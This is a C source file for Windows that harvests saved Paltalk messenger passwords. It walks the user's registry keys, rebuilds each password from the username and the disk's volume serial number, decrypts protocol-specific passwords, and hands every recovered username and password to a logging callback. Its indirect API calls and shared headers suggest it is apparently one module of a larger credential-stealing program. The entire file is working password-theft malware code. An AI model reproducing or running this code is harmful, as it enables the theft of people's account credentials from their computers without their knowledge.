
#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include "..\common.h"
#include "base64.h"

// callback for the password
extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);

extern int Decrypt(CHAR *cryptData, WCHAR *clearData, UINT clearSize); // in thunderbird.cpp

#define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);

struct p_entry {
	WCHAR service[64];
	WCHAR resource[255];
	WCHAR user_name[255];
	WCHAR user_value[255];
	WCHAR pass_name[255];
	WCHAR pass_value[255];
};

int decode_pass_paltalk(char *user, char *serial, char *pass, char *decoded)
{
	CHAR mix[MAX_PATH];
	char *mixp;
	int i, j, k;
	int len, plen;

	memset(mix, 0, MAX_PATH);

	for (i = 0, j = 0, k = 0; (user[i] != NULL) || (serial[j] != NULL); ) {
		if (user[i] != NULL) 
			mix[k++] = user[i++];

		if (serial[j] != NULL)
			mix[k++] = serial[j++];
	}
	mix[k] = 0;

	len = strlen(mix);
	plen = strlen(pass);

	memcpy(mix+len, mix, len);
	memcpy(mix+len*2, mix, len);

	mixp = mix + len - 1;
	k = 0;

	for (i = 0; pass[i] != NULL; i += 4) {
		char *p = pass + i + 3;
		char letter;
		*p = 0;
		j = atoi(pass + i);
		j &= 0xff;
		letter = 0x86 - (char)*(mixp + k);
		letter -= k++;
		letter += j;
		decoded[k-1] = letter;
	}
	decoded[k] = 0;

	return 0;
}

int DumpPaltalk(void)
{
	HKEY hreg, hsub, hproto, hpwd;
	DWORD nreg = 0, nsub = 0, nproto = 0;
	WCHAR keyname[MAX_PATH];
	WCHAR userkey[MAX_PATH];
	WCHAR protocolkey[MAX_PATH];
	WCHAR subkey[MAX_PATH];
	CHAR password[MAX_PATH];
	DWORD size;
	DWORD hdserial;
	struct p_entry ptentry;

	// get the HD serial number (used to decrypt the password)
	FNC(GetVolumeInformationA)("c:\\", NULL, 0, &hdserial, NULL, NULL, NULL, 0);

	if (FNC(RegOpenKeyW)(HKEY_CURRENT_USER, L"Software\\Paltalk", &hreg) != ERROR_SUCCESS)
		return 0;

	// enumerate all the users
	while (FNC(RegEnumKeyW)(hreg, nreg++, keyname, MAX_PATH) == ERROR_SUCCESS) {
		nsub = 0;

		memset(&ptentry, 0, sizeof(ptentry));

		swprintf_s(ptentry.service, 255, L"Paltalk");

		_snwprintf_s(userkey, MAX_PATH, L"Software\\Paltalk\\%s", keyname);
		
		// open the user section
		if (FNC(RegOpenKeyW)(HKEY_CURRENT_USER, userkey, &hsub) != ERROR_SUCCESS)
			continue;

		size = sizeof(password);
		if (FNC(RegQueryValueExA)(hsub, "pwd", NULL, NULL, (LPBYTE)&password, &size) == ERROR_SUCCESS) {
			CHAR user[MAX_PATH];
			CHAR serial[16];
			CHAR decoded[MAX_PATH];
			sprintf_s(serial, 16, "%08X", hdserial);
			sprintf_s(user, MAX_PATH, "%S", keyname);
			memset(decoded, 0, MAX_PATH);
			
			swprintf_s(ptentry.resource, 255, L"PALTALK");
			swprintf_s(ptentry.user_value, 255, L"%S", user);
			decode_pass_paltalk(user, serial, password, decoded);
			swprintf_s(ptentry.pass_value, 255, L"%S", decoded);
			LogPassword(ptentry.service, ptentry.resource, ptentry.user_value, ptentry.pass_value);
		}

		//enumerate all the protocols
		while (FNC(RegEnumKeyW)(hsub, nsub++, keyname, MAX_PATH) == ERROR_SUCCESS) {
			nproto = 0;
			_snwprintf_s(protocolkey, MAX_PATH, L"%s\\%s", userkey, keyname);
			
			swprintf_s(ptentry.resource, 255, L"%s", keyname);

			if (FNC(RegOpenKeyW)(HKEY_CURRENT_USER, protocolkey, &hproto) != ERROR_SUCCESS)
				continue;
			
			while (FNC(RegEnumKeyW)(hproto, nproto++, keyname, MAX_PATH) == ERROR_SUCCESS) {
				
				_snwprintf_s(subkey, MAX_PATH, L"%s\\%s", protocolkey, keyname);
				
				swprintf_s(ptentry.user_value, 255, L"%s", keyname);

				if (FNC(RegOpenKeyW)(HKEY_CURRENT_USER, subkey, &hpwd) != ERROR_SUCCESS)
					continue;

				size = sizeof(password);
				if (FNC(RegQueryValueExA)(hpwd, "pwd", NULL, NULL, (LPBYTE)&password, &size) == ERROR_SUCCESS) {
					Decrypt(password, ptentry.pass_value, 255);
					LogPassword(ptentry.service, ptentry.resource, ptentry.user_value, ptentry.pass_value);
				}
				FNC(RegCloseKey)(hpwd);
			}
			FNC(RegCloseKey)(hproto);
		}
		FNC(RegCloseKey)(hsub);
	}
	FNC(RegCloseKey)(hreg);

	return 0;
}
